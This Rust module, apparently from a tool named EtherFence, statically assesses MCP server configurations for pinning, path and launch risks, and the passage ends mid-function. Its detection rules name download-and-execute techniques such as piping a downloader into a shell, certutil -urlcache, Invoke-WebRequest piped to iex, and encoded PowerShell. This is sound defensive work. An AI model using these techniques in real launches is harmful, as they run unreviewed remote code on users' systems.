//! Static, local-only MCP server trust and integrity assessment (v1.3.0).
//!
//! Every function here is pure over already-parsed local configuration data
//! (plus, for local artifact hashing, a bounded local file read of a
//! directly configured executable path). Nothing here starts a process,
//! opens a network connection, or invokes any MCP protocol method. This
//! module never proves a server is safe, trusted, certified, malware-free,
//! or definitively malicious — see `docs/setup-onboarding.md` for the exact
//! limiting language every vocabulary value carries.

use etherfence_core::{EnvVar, McpServer, Severity};
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::io::Read;
use std::path::Path;

// ---------------------------------------------------------------------
// Vocabulary (spec FR-058-FR-060)
// ---------------------------------------------------------------------

/// Artifact Identity Confidence. `VerifiedLocal` and `KnownSource` never
/// imply authenticity, provenance, installation integrity, or safety —
/// see `docs/setup-onboarding.md` for the exact limiting language.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum ArtifactIdentityConfidence {
    VerifiedLocal,
    KnownSource,
    Unknown,
}

/// Configuration Risk status. `NoKnownIndicators` means only that no
/// implemented v1.3.0 indicator triggered — never an absence-of-risk
/// guarantee.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum ConfigurationRiskStatus {
    NoKnownIndicators,
    NeedsReview,
    HighRisk,
}

/// Aggregate Assessment status, derived by `aggregate()` below (FR-061).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum AggregateAssessmentStatus {
    VerifiedLocal,
    KnownSource,
    NeedsReview,
    HighRisk,
    Unknown,
}

/// Derives Aggregate Assessment status from Artifact Identity Confidence
/// and Configuration Risk status using the configuration-risk-first
/// precedence rule (spec FR-061 / research.md Decision 7): a raised
/// configuration risk indicator is never hidden by a favorable artifact
/// identity result, while a favorable artifact identity result still
/// surfaces to the Aggregate whenever no configuration risk indicator
/// fired. `artifact`/`risk` remain independently reported alongside the
/// Aggregate regardless of which one determined its value.
pub fn aggregate(
    artifact: ArtifactIdentityConfidence,
    risk: ConfigurationRiskStatus,
) -> AggregateAssessmentStatus {
    match risk {
        ConfigurationRiskStatus::HighRisk => AggregateAssessmentStatus::HighRisk,
        ConfigurationRiskStatus::NeedsReview => AggregateAssessmentStatus::NeedsReview,
        ConfigurationRiskStatus::NoKnownIndicators => match artifact {
            ArtifactIdentityConfidence::VerifiedLocal => AggregateAssessmentStatus::VerifiedLocal,
            ArtifactIdentityConfidence::KnownSource => AggregateAssessmentStatus::KnownSource,
            ArtifactIdentityConfidence::Unknown => AggregateAssessmentStatus::Unknown,
        },
    }
}

/// Derives the needs-review flag from Aggregate Assessment status (FR-062):
/// `true` for `NeedsReview`/`HighRisk`/`Unknown`, `false` for
/// `VerifiedLocal`/`KnownSource` — a single rule derived directly from
/// `aggregate()`'s output.
pub fn needs_review(status: AggregateAssessmentStatus) -> bool {
    matches!(
        status,
        AggregateAssessmentStatus::NeedsReview
            | AggregateAssessmentStatus::HighRisk
            | AggregateAssessmentStatus::Unknown
    )
}

/// Derives Configuration Risk status from the raised indicator set:
/// `HighRisk` if any indicator is `Severity::High`, else `NeedsReview` if
/// any indicator exists at all, else `NoKnownIndicators`.
pub fn configuration_risk_from_indicators(
    indicators: &[TrustIndicator],
) -> ConfigurationRiskStatus {
    if indicators.iter().any(|i| i.severity == Severity::High) {
        ConfigurationRiskStatus::HighRisk
    } else if indicators.is_empty() {
        ConfigurationRiskStatus::NoKnownIndicators
    } else {
        ConfigurationRiskStatus::NeedsReview
    }
}

// ---------------------------------------------------------------------
// Indicators (spec FR-064-FR-068)
// ---------------------------------------------------------------------

/// Fixed canonical order for indicator categories (research.md Decision
/// 13), most-actionable-first. Used both for `IndicatorCategory::ALL` and
/// for deterministic indicator sorting via `sort_indicators`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum IndicatorCategory {
    ObscuredLaunch,
    ShellWrapper,
    PackagePinning,
    ExecutablePath,
    LocalArtifact,
    UnicodeIdentity,
    EnvironmentVariable,
}

impl IndicatorCategory {
    pub const ALL: [IndicatorCategory; 7] = [
        IndicatorCategory::ObscuredLaunch,
        IndicatorCategory::ShellWrapper,
        IndicatorCategory::PackagePinning,
        IndicatorCategory::ExecutablePath,
        IndicatorCategory::LocalArtifact,
        IndicatorCategory::UnicodeIdentity,
        IndicatorCategory::EnvironmentVariable,
    ];

    fn canonical_index(self) -> usize {
        Self::ALL
            .iter()
            .position(|category| *category == self)
            .expect("IndicatorCategory::ALL is exhaustive")
    }
}

/// Closed set of safe, structured evidence field keys (FR-065). Values are
/// always safe tokens — never raw command strings, environment values, or
/// file content.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum EvidenceKey {
    Runner,
    PackageIdentity,
    VersionExpression,
    WrapperType,
    ObscuredLaunchPattern,
    OptionName,
    PathClassification,
    EnvironmentVariableName,
    UnicodeCategory,
    CuratedRuleId,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EvidenceField {
    pub key: EvidenceKey,
    pub value: String,
}

impl EvidenceField {
    pub fn new(key: EvidenceKey, value: impl Into<String>) -> Self {
        EvidenceField {
            key,
            value: value.into(),
        }
    }
}

/// One raised finding. `severity` reuses `etherfence_core::Severity`
/// rather than a second, parallel severity scale (research.md Decision 3).
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TrustIndicator {
    pub id: String,
    pub severity: Severity,
    pub category: IndicatorCategory,
    pub summary: String,
    pub rationale: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence: Vec<EvidenceField>,
    pub remediation: String,
}

/// Sorts indicators into the fixed, deterministic `(category, id)` order
/// (FR-067) — independent of the order the underlying rules matched in.
pub fn sort_indicators(indicators: &mut [TrustIndicator]) {
    indicators.sort_by(|a, b| {
        a.category
            .canonical_index()
            .cmp(&b.category.canonical_index())
            .then_with(|| a.id.cmp(&b.id))
    });
}

// ---------------------------------------------------------------------
// Invocation identity and form (spec FR-011-FR-029)
// ---------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum PackageRunner {
    Npx,
    Uvx,
    PipxRun,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum VersionExpressionKind {
    ExactlyPinned,
    Omitted,
    MutableTag,
    VersionRange,
    UnsupportedOrAmbiguous,
}

pub fn human_label_version_expression(kind: VersionExpressionKind) -> &'static str {
    match kind {
        VersionExpressionKind::ExactlyPinned => "exactly pinned",
        VersionExpressionKind::Omitted => "omitted",
        VersionExpressionKind::MutableTag => "mutable tag",
        VersionExpressionKind::VersionRange => "version range",
        VersionExpressionKind::UnsupportedOrAmbiguous => "unsupported or ambiguous",
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum ShellWrapperKind {
    ShC,
    BashC,
    CmdC,
    PowershellCommand,
    PowershellEncodedCommand,
    PwshCommand,
    PwshEncodedCommand,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum ObscuredLaunchPattern {
    PipeToShellDownloader,
    EncodedPowerShellOption,
    WindowsCertutilDownloadPattern,
    PowershellWebRequestToInvokeExpression,
    DecodeThenExecutePipedToShell,
}

/// Invocation Identity and Form for one server. `applicable = false` only
/// for remote/URL-configured servers (FR-057b); every other field is then
/// left at its default (`None`/`false`/empty).
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InvocationAssessment {
    pub applicable: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub runner: Option<PackageRunner>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub package_identity: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version_expression: Option<VersionExpressionKind>,
    pub malformed_runner_invocation: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub shell_wrapper: Option<ShellWrapperKind>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub obscured_launch_patterns: Vec<ObscuredLaunchPattern>,
}

impl InvocationAssessment {
    fn not_applicable() -> Self {
        InvocationAssessment {
            applicable: false,
            runner: None,
            package_identity: None,
            version_expression: None,
            malformed_runner_invocation: false,
            shell_wrapper: None,
            obscured_launch_patterns: Vec::new(),
        }
    }

    fn applicable_default() -> Self {
        InvocationAssessment {
            applicable: true,
            runner: None,
            package_identity: None,
            version_expression: None,
            malformed_runner_invocation: false,
            shell_wrapper: None,
            obscured_launch_patterns: Vec::new(),
        }
    }
}

// ---------------------------------------------------------------------
// Executable path classification (spec FR-030-FR-045)
// ---------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum ExecutablePathClassification {
    AbsolutePath,
    RelativePath,
    PathResolvedCommand,
    MissingPath,
    NonRegularFile,
    Symlink,
    TemporaryDirectoryLocation,
    AmbiguousOrUnsupported,
    NotApplicable,
}

// ---------------------------------------------------------------------
// Top-level assessment (spec FR-001-FR-010)
// ---------------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TrustAssessment {
    pub artifact_identity: ArtifactIdentityConfidence,
    /// Deterministic, human-readable explanation of *why*
    /// `artifact_identity` holds its value — in particular, for a remote
    /// (URL-configured) server, this MUST explicitly state that `unknown`
    /// reflects "no local invocation to assess" rather than a failed or
    /// inconclusive local inspection (FR-057c). Always present, for every
    /// server, so the same field always carries this explanation
    /// regardless of transport or outcome.
    pub artifact_identity_rationale: String,
    pub configuration_risk: ConfigurationRiskStatus,
    pub aggregate: AggregateAssessmentStatus,
    pub needs_review: bool,
    pub invocation: InvocationAssessment,
    pub executable_path: ExecutablePathClassification,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
    #[serde(default)]
    pub indicators: Vec<TrustIndicator>,
}

/// Computes the full trust-and-integrity assessment for one MCP server.
/// Pure function of `server`'s already-parsed fields, plus (only for a
/// direct local executable path, inside `classify_executable_path_and_hash`)
/// a bounded local file read — never starts a process, opens a network
/// connection, or invokes any MCP protocol method.
///
/// A remote/URL-configured server (`command` absent, `url` present) skips
/// invocation/executable-path/local-artifact assessment entirely (reported
/// as not applicable, FR-057b) but still runs environment-variable and
/// Unicode/identity-ambiguity assessment (FR-057a).
pub fn assess_trust(server: &McpServer) -> TrustAssessment {
    let is_remote = server.command.is_none() && server.url.is_some();

    let mut indicators: Vec<TrustIndicator> = Vec::new();
    let mut artifact_identity = ArtifactIdentityConfidence::Unknown;
    let mut executable_path = ExecutablePathClassification::NotApplicable;
    let mut sha256: Option<String> = None;
    let mut invocation = InvocationAssessment::not_applicable();

    if is_remote {
        // FR-057b/FR-057c: invocation/path/local-artifact are explicitly
        // not applicable, distinct from an assessed-and-inconclusive
        // `Unknown` result.
    } else {
        invocation = InvocationAssessment::applicable_default();
        assess_invocation_runner(server, &mut invocation, &mut indicators);
        assess_shell_wrapper_and_obscured_launch(server, &mut invocation, &mut indicators);
        let (path_class, hash) = classify_executable_path_and_hash(server, &mut indicators);
        executable_path = path_class;
        sha256 = hash;
        artifact_identity = derive_artifact_identity(&sha256, &invocation.package_identity);
    }

    // FR-057a: environment-variable and Unicode/identity-ambiguity checks
    // run for every server, stdio or remote.
    //
    // Order matters here: every *independent* finding (invocation/wrapper/
    // path/hash above, and Unicode below) must be collected before the
    // environment assessment's secret-like escalation is finalized, since
    // that escalation depends on whether a high-severity indicator exists
    // anywhere in the server's final indicator set (FR-054) — deciding it
    // too early would silently miss a high-severity finding from an area
    // that happens to run later.
    assess_unicode_identity(
        server,
        invocation.package_identity.as_deref(),
        &mut indicators,
    );
    let secret_like_env_names = assess_environment_categories(&server.env, &mut indicators);
    finalize_secret_like_indicators(&secret_like_env_names, artifact_identity, &mut indicators);

    sort_indicators(&mut indicators);
    let configuration_risk = configuration_risk_from_indicators(&indicators);
    let aggregate_status = aggregate(artifact_identity, configuration_risk);
    let needs_review_flag = needs_review(aggregate_status);

    TrustAssessment {
        artifact_identity,
        artifact_identity_rationale: artifact_identity_rationale(is_remote, artifact_identity),
        configuration_risk,
        aggregate: aggregate_status,
        needs_review: needs_review_flag,
        invocation,
        executable_path,
        sha256,
        indicators,
    }
}

/// Deterministic, human-readable explanation of why `artifact_identity`
/// holds its value (FR-057c requires this explicitly for the remote case,
/// distinguishing "no local invocation to assess" from a failed or
/// inconclusive local inspection; the same field is populated for every
/// server so its shape never varies by transport or outcome).
fn artifact_identity_rationale(
    is_remote: bool,
    artifact_identity: ArtifactIdentityConfidence,
) -> String {
    if is_remote {
        return "This server has no local invocation to assess: it is configured with a \
                 remote URL rather than a local command, so there is no executable path, \
                 local artifact, or package-runner invocation to evaluate. This is not a \
                 failed or inconclusive local inspection."
            .to_string();
    }
    match artifact_identity {
        ArtifactIdentityConfidence::VerifiedLocal => {
            "The configured executable at this server's local path was inspected and its \
             SHA-256 identity was recorded under bounded, race-safe conditions. This does \
             not mean the underlying program is safe."
                .to_string()
        }
        ArtifactIdentityConfidence::KnownSource => {
            "This server's parsed package identity is an exact match against a small \
             curated known-source table. This does not prove package authenticity, \
             provenance, installation integrity, or safety."
                .to_string()
        }
        ArtifactIdentityConfidence::Unknown => {
            "No local executable could be hashed (the configured path is not an eligible \
             absolute regular file) and no curated known-source identity match was found. \
             This does not prove the server is unsafe or malicious."
                .to_string()
        }
    }
}

// ---------------------------------------------------------------------
// Per-story stub entry points. Foundational (Phase 2) installs each as a
// safe no-op; each user story below replaces exactly one, independently
// of the others.
// ---------------------------------------------------------------------

// ---------------------------------------------------------------------
// User Story 1: package-runner invocation pinning (spec FR-011-FR-020)
// ---------------------------------------------------------------------

/// Curated, closed set of npm dist-tags treated as mutable (research.md
/// Decision 4). Exact-match only.
const MUTABLE_NPM_TAGS: &[&str] = &["latest", "next", "beta", "alpha", "canary", "rc"];

fn runner_token(runner: PackageRunner) -> &'static str {
    match runner {
        PackageRunner::Npx => "npx",
        PackageRunner::Uvx => "uvx",
        PackageRunner::PipxRun => "pipx-run",
    }
}

fn version_expression_token(kind: VersionExpressionKind) -> &'static str {
    match kind {
        VersionExpressionKind::ExactlyPinned => "exactly-pinned",
        VersionExpressionKind::Omitted => "omitted",
        VersionExpressionKind::MutableTag => "mutable-tag",
        VersionExpressionKind::VersionRange => "version-range",
        VersionExpressionKind::UnsupportedOrAmbiguous => "unsupported-or-ambiguous",
    }
}

/// Splits an npx package argument into `(package_identity, version)`.
/// Scoped packages (`@scope/name@version`) split on the *second* `@`, so
/// the scope's own leading `@` is never mistaken for the version
/// separator (spec FR-013).
fn split_npx_package_version(token: &str) -> (&str, Option<&str>) {
    if let Some(rest) = token.strip_prefix('@') {
        match rest.find('@') {
            Some(idx) => (&token[..idx + 1], Some(&token[idx + 2..])),
            None => (token, None),
        }
    } else {
        match token.find('@') {
            Some(idx) => (&token[..idx], Some(&token[idx + 1..])),
            None => (token, None),
        }
    }
}

/// Narrow, closed range-operator/wildcard check for npm version
/// expressions (research.md Decision 4) — not a general semver-range
/// parser.
fn is_npm_range(version: &str) -> bool {
    version.starts_with('^')
        || version.starts_with('~')
        || version.starts_with(">=")
        || version.starts_with("<=")
        || version.starts_with('>')
        || version.starts_with('<')
        || version.contains("||")
        || version.contains(',')
        || version
            .split('.')
            .any(|part| part == "x" || part == "X" || part == "*")
}

/// A single fully-resolved version token: starts with a digit and
/// contains only version-identifier characters (no range operators —
/// those are excluded earlier by `is_npm_range`).
fn is_exact_version_like(version: &str) -> bool {
    matches!(version.chars().next(), Some(c) if c.is_ascii_digit())
        && version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '+')
}

fn classify_npx_version(version: Option<&str>) -> VersionExpressionKind {
    match version {
        None => VersionExpressionKind::Omitted,
        Some("") => VersionExpressionKind::UnsupportedOrAmbiguous,
        Some(v) if MUTABLE_NPM_TAGS.contains(&v) => VersionExpressionKind::MutableTag,
        Some(v) if is_npm_range(v) => VersionExpressionKind::VersionRange,
        Some(v) if is_exact_version_like(v) => VersionExpressionKind::ExactlyPinned,
        Some(_) => VersionExpressionKind::UnsupportedOrAmbiguous,
    }
}

/// Resolves the npx package argument by reusing `classification.rs`'s
/// existing `resolve_package_arg` (skips `-y`/`--yes`/`--package
/// <value>`/`--package=<value>`) — the same helper v1.2.0 capability
/// classification already uses for this exact shape (research.md
/// Decision 4).
fn resolve_npx_package_token(args: &[String]) -> Option<&str> {
    crate::classification::resolve_package_arg(args)
}

/// Resolves the uvx package argument: `uvx --from <spec> <tool>` takes the
/// spec after `--from`; otherwise the first argument is the spec, unless
/// it is an unrecognized flag (leading `-`), which is reported as a
/// malformed invocation rather than silently skipped.
fn resolve_uvx_package_token(args: &[String]) -> Option<&str> {
    let first = args.first()?;
    if first == "--from" {
        return args.get(1).map(String::as_str);
    }
    if first.starts_with('-') {
        return None;
    }
    Some(first.as_str())
}

/// Resolves the `pipx run` package argument (the caller has already
/// confirmed `args[0] == "run"`): `pipx run --spec <spec> <tool>` takes
/// the spec after `--spec`; otherwise the next argument is the spec,
/// unless it is an unrecognized flag.
fn resolve_pipx_run_package_token(args: &[String]) -> Option<&str> {
    let rest = args.get(1..)?;
    let first = rest.first()?;
    if first == "--spec" {
        return rest.get(1).map(String::as_str);
    }
    if first.starts_with('-') {
        return None;
    }
    Some(first.as_str())
}

/// A single, unambiguous PEP 440 version identifier suitable for `==` to
/// mean "exactly pinned": starts with a digit, contains only
/// version-identifier characters, and contains no wildcard, comma
/// (compound specifier), or semicolon (environment marker). Notably this
/// rejects PEP 440 "version matching" wildcards such as `1.2.*`, which is
/// a prefix match over a range of versions, not a single resolved version
/// (FR-014/FR-015).
fn is_exact_pep440_version(version: &str) -> bool {
    if version.is_empty() || version.contains(['*', ',', ';', ' ']) {
        return false;
    }
    matches!(version.chars().next(), Some(c) if c.is_ascii_digit())
        && version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
}

/// Classifies the specifier text following a recognized 2-character PEP
/// 440 operator (`op`) against a package. A compound (comma-separated)
/// specifier or one carrying an environment marker (semicolon) is always
/// `VersionRange`, regardless of `op` — a compound expression is never a
/// single resolved version. For any operator other than `==`, anything
/// else non-empty is `VersionRange` (inequalities/approximate-version
/// operators never pin a single version). For `==` specifically, the
/// remainder must be `is_exact_pep440_version` to count as
/// `ExactlyPinned`; a wildcard remainder (`1.2.*`) is `VersionRange`
/// (PEP 440 "version matching" is a prefix match, not an exact pin); any
/// other malformed remainder is `UnsupportedOrAmbiguous`.
fn classify_pep440_rest(rest: &str, op: &str) -> VersionExpressionKind {
    if rest.is_empty() {
        return VersionExpressionKind::UnsupportedOrAmbiguous;
    }
    if rest.contains(',') || rest.contains(';') {
        return VersionExpressionKind::VersionRange;
    }
    if op != "==" {
        return VersionExpressionKind::VersionRange;
    }
    if is_exact_pep440_version(rest) {
        VersionExpressionKind::ExactlyPinned
    } else if rest.contains('*') {
        VersionExpressionKind::VersionRange
    } else {
        VersionExpressionKind::UnsupportedOrAmbiguous
    }
}

/// Splits a uvx/pipx-run package argument into `(package_identity,
/// VersionExpressionKind)` using PEP 440-style specifier operators.
/// `==` is the only operator that can yield `ExactlyPinned`, and only for
/// a single unambiguous version identifier (see
/// `is_exact_pep440_version`) — a wildcard (`1.2.*`), a compound
/// (comma-separated) specifier, an environment marker (semicolon), or the
/// distinct PEP 440 "arbitrary equality" operator (`===`, a literal string
/// comparison rather than a normal version pin) are all explicitly never
/// `ExactlyPinned`. Every other operator yields `VersionRange`. No bare
/// package name yields `Omitted`. There is no `MutableTag` case for these
/// two runners — PyPI has no dist-tag convention analogous to npm
/// (research.md Decision 4, intentional asymmetry).
fn classify_pep440(token: &str) -> (&str, VersionExpressionKind) {
    // Checked before the 2-character `==` operator below: `===` contains
    // `==` as a prefix, so checking `==` first would find `===`'s first
    // two `=` characters and misparse the third as part of the version
    // remainder instead of recognizing this as the distinct arbitrary-
    // equality operator.
    if let Some(idx) = token.find("===") {
        let package = &token[..idx];
        return (package, VersionExpressionKind::UnsupportedOrAmbiguous);
    }

    const TWO_CHAR_OPS: &[&str] = &["==", ">=", "<=", "!=", "~="];
    for op in TWO_CHAR_OPS {
        if let Some(idx) = token.find(op) {
            let package = &token[..idx];
            let rest = &token[idx + op.len()..];
            let kind = classify_pep440_rest(rest, op);
            return (package, kind);
        }
    }
    for op in ['>', '<'] {
        if let Some(idx) = token.find(op) {
            let package = &token[..idx];
            let rest = &token[idx + 1..];
            let kind = if rest.is_empty() {
                VersionExpressionKind::UnsupportedOrAmbiguous
            } else {
                VersionExpressionKind::VersionRange
            };
            return (package, kind);
        }
    }
    (token, VersionExpressionKind::Omitted)
}

fn push_pinning_indicator(
    indicators: &mut Vec<TrustIndicator>,
    runner: PackageRunner,
    package: &str,
    kind: VersionExpressionKind,
) {
    let (id, severity, summary): (&str, Severity, &str) = match kind {
        VersionExpressionKind::ExactlyPinned => return,
        VersionExpressionKind::Omitted => (
            "EF-TRUST-PIN-001",
            Severity::Medium,
            "Package version is omitted",
        ),
        VersionExpressionKind::MutableTag => (
            "EF-TRUST-PIN-002",
            Severity::Medium,
            "Package version uses a mutable tag",
        ),
        VersionExpressionKind::VersionRange => (
            "EF-TRUST-PIN-003",
            Severity::Medium,
            "Package version is a range, not an exact pin",
        ),
        VersionExpressionKind::UnsupportedOrAmbiguous => (
            "EF-TRUST-PIN-004",
            Severity::Low,
            "Package version expression is unsupported or ambiguous",
        ),
    };
    indicators.push(TrustIndicator {
        id: id.to_string(),
        severity,
        category: IndicatorCategory::PackagePinning,
        summary: summary.to_string(),
        rationale: format!(
            "The {} invocation for '{package}' has a {} version expression, so the resolved package may not be exactly reproducible on a future run.",
            runner_token(runner),
            human_label_version_expression(kind)
        ),
        evidence: vec![
            EvidenceField::new(EvidenceKey::Runner, runner_token(runner)),
            EvidenceField::new(EvidenceKey::PackageIdentity, package.to_string()),
            EvidenceField::new(EvidenceKey::VersionExpression, version_expression_token(kind)),
        ],
        remediation: "Pin an exact version for this package.".to_string(),
    });
}

fn push_malformed_runner_indicator(indicators: &mut Vec<TrustIndicator>, runner: PackageRunner) {
    indicators.push(TrustIndicator {
        id: "EF-TRUST-PIN-005".to_string(),
        severity: Severity::Low,
        category: IndicatorCategory::PackagePinning,
        summary: "Runner invocation could not be parsed into a package identity".to_string(),
        rationale: format!(
            "The {} invocation's arguments do not match a recognized package-identity shape.",
            runner_token(runner)
        ),
        evidence: vec![EvidenceField::new(
            EvidenceKey::Runner,
            runner_token(runner),
        )],
        remediation:
            "Review the server's launch command; the package it runs could not be determined."
                .to_string(),
    });
}

/// User Story 1 (T017-T019): npx/uvx/pipx run package-identity and
/// version-expression parsing.
fn assess_invocation_runner(
    server: &McpServer,
    invocation: &mut InvocationAssessment,
    indicators: &mut Vec<TrustIndicator>,
) {
    let Some(command) = server.command.as_deref() else {
        return;
    };
    let name = crate::classification::launcher_name(command);
    let runner = match name {
        "npx" => Some(PackageRunner::Npx),
        "uvx" => Some(PackageRunner::Uvx),
        "pipx" if server.args.first().map(String::as_str) == Some("run") => {
            Some(PackageRunner::PipxRun)
        }
        _ => None,
    };
    let Some(runner) = runner else {
        return;
    };
    invocation.runner = Some(runner);

    let token = match runner {
        PackageRunner::Npx => resolve_npx_package_token(&server.args),
        PackageRunner::Uvx => resolve_uvx_package_token(&server.args),
        PackageRunner::PipxRun => resolve_pipx_run_package_token(&server.args),
    };

    let Some(token) = token.filter(|t| !t.is_empty()) else {
        invocation.malformed_runner_invocation = true;
        push_malformed_runner_indicator(indicators, runner);
        return;
    };

    let (package, kind) = match runner {
        PackageRunner::Npx => {
            let (package, version) = split_npx_package_version(token);
            (package, classify_npx_version(version))
        }
        PackageRunner::Uvx | PackageRunner::PipxRun => classify_pep440(token),
    };

    if package.is_empty() {
        invocation.malformed_runner_invocation = true;
        push_malformed_runner_indicator(indicators, runner);
        return;
    }

    invocation.package_identity = Some(package.to_string());
    invocation.version_expression = Some(kind);
    push_pinning_indicator(indicators, runner, package, kind);
}

// ---------------------------------------------------------------------
// User Story 2: shell-wrapper and obscured-launch detection
// (spec FR-021-FR-029)
// ---------------------------------------------------------------------

fn wrapper_token(kind: ShellWrapperKind) -> &'static str {
    match kind {
        ShellWrapperKind::ShC => "sh-c",
        ShellWrapperKind::BashC => "bash-c",
        ShellWrapperKind::CmdC => "cmd-c",
        ShellWrapperKind::PowershellCommand => "powershell-command",
        ShellWrapperKind::PowershellEncodedCommand => "powershell-encoded-command",
        ShellWrapperKind::PwshCommand => "pwsh-command",
        ShellWrapperKind::PwshEncodedCommand => "pwsh-encoded-command",
    }
}

fn obscured_launch_token(pattern: ObscuredLaunchPattern) -> &'static str {
    match pattern {
        ObscuredLaunchPattern::PipeToShellDownloader => "pipe-to-shell-downloader",
        ObscuredLaunchPattern::EncodedPowerShellOption => "encoded-powershell-option",
        ObscuredLaunchPattern::WindowsCertutilDownloadPattern => {
            "windows-certutil-download-pattern"
        }
        ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression => {
            "powershell-web-request-to-invoke-expression"
        }
        ObscuredLaunchPattern::DecodeThenExecutePipedToShell => {
            "decode-then-execute-piped-to-shell"
        }
    }
}

fn push_wrapper_indicator(indicators: &mut Vec<TrustIndicator>, wrapper: ShellWrapperKind) {
    indicators.push(TrustIndicator {
        id: "EF-TRUST-SHW-001".to_string(),
        severity: Severity::Medium,
        category: IndicatorCategory::ShellWrapper,
        summary: "Server is launched through a shell interpreter wrapper".to_string(),
        rationale: format!(
            "The launch command routes through {}, so EtherFence cannot fully account for what the wrapped command does beyond static inspection.",
            wrapper_token(wrapper)
        ),
        evidence: vec![EvidenceField::new(EvidenceKey::WrapperType, wrapper_token(wrapper))],
        remediation:
            "Prefer launching the MCP server binary directly instead of through a shell wrapper, if possible."
                .to_string(),
    });
}

fn push_obscured_launch_indicator(
    indicators: &mut Vec<TrustIndicator>,
    pattern: ObscuredLaunchPattern,
) {
    let (id, summary, remediation): (&str, &str, &str) = match pattern {
        ObscuredLaunchPattern::PipeToShellDownloader => (
            "EF-TRUST-OBS-001",
            "Launch command pipes a downloader directly into a shell",
            "Avoid piping a downloaded script directly into a shell interpreter; download, inspect, then run separately.",
        ),
        ObscuredLaunchPattern::EncodedPowerShellOption => (
            "EF-TRUST-OBS-002",
            "Launch command uses an encoded PowerShell command option",
            "Avoid -EncodedCommand; use a plain, reviewable -Command string instead.",
        ),
        ObscuredLaunchPattern::WindowsCertutilDownloadPattern => (
            "EF-TRUST-OBS-003",
            "Launch command uses certutil in a known download pattern",
            "certutil -urlcache is a documented living-off-the-land download technique; avoid using it to launch MCP servers.",
        ),
        ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression => (
            "EF-TRUST-OBS-004",
            "Launch command downloads and immediately executes a PowerShell script",
            "Avoid piping Invoke-WebRequest/iwr output into Invoke-Expression/iex.",
        ),
        ObscuredLaunchPattern::DecodeThenExecutePipedToShell => (
            "EF-TRUST-OBS-005",
            "Launch command decodes and pipes content directly into a shell",
            "Avoid piping decoded content directly into a shell interpreter.",
        ),
    };
    indicators.push(TrustIndicator {
        id: id.to_string(),
        severity: Severity::High,
        category: IndicatorCategory::ObscuredLaunch,
        summary: summary.to_string(),
        rationale: format!(
            "The launch command matches the '{}' obscured-launch pattern.",
            obscured_launch_token(pattern)
        ),
        evidence: vec![EvidenceField::new(
            EvidenceKey::ObscuredLaunchPattern,
            obscured_launch_token(pattern),
        )],
        remediation: remediation.to_string(),
    });
}

/// Narrow, closed-world tokenizer used only to test membership of a small
/// fixed cmdlet-name set — not a general shell/PowerShell parser.
fn contains_word(lower_haystack: &str, word: &str) -> bool {
    lower_haystack
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '(' | ')' | '"' | '\''))
        .any(|token| token == word)
}

/// FR-028(c): a recognized web-request cmdlet/alias piped directly into a
/// recognized expression-execution cmdlet/alias. Requires bounded
/// pipe-segment adjacency — the download token must appear in a pipeline
/// segment immediately followed (via `|`) by a segment that *starts with*
/// the execution token — rather than merely checking that both tokens
/// occur anywhere in the command string. Two tokens present but not
/// piped together (for example, separated by `;`, or piped through an
/// unrelated intermediate cmdlet) must not match.
fn powershell_downloads_and_executes(wrapped: &str) -> bool {
    const DOWNLOAD_TOKENS: &[&str] = &["invoke-webrequest", "iwr", "invoke-restmethod", "irm"];
    const EXEC_TOKENS: &[&str] = &["invoke-expression", "iex"];

    let lower = wrapped.to_ascii_lowercase();
    let segments: Vec<&str> = lower.split('|').map(str::trim).collect();
    if segments.len() < 2 {
        return false;
    }

    segments.windows(2).any(|pair| {
        let left = pair[0];
        let right = pair[1];
        let left_has_download = DOWNLOAD_TOKENS.iter().any(|kw| contains_word(left, kw));
        let right_starts_with_exec = right
            .split_whitespace()
            .next()
            .is_some_and(|first| EXEC_TOKENS.contains(&first));
        left_has_download && right_starts_with_exec
    })
}

/// FR-028(a)/(d): a recognized downloader or decode utility composed via a
/// shell pipe into a recognized shell interpreter. Operates on only the
/// segment immediately before the last `|` and the segment immediately
/// after it (research.md Decision 5) — a multi-stage pipeline's earlier
/// segments are irrelevant to this narrow structural rule.
fn pipe_to_shell_pattern(wrapped: &str) -> Option<ObscuredLaunchPattern> {
    let segments: Vec<&str> = wrapped.split('|').map(str::trim).collect();
    if segments.len() < 2 {
        return None;
    }
    let right = segments[segments.len() - 1];
